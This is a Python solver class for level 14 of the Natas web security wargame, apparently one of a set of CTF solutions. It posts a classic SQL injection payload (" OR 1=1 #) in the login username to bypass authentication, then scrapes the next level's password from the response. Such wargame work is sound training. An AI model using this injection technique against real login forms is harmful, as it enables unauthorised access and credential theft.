import re
from .base_solver import NatasSolver

class Natas14Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # SQL injection payload with comment
            response = self.make_request(
                method="POST",
                data={
                    "username": 'natas15 " OR 1=1 #',
                    "password": ""
                }
            )
            
            # Extract password using the exact pattern
            match = re.findall(r"The password for natas15 is (.*)<br>", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()

        except Exception as e:
            raise RuntimeError(f"Failed to solve natas14: {str(e)}")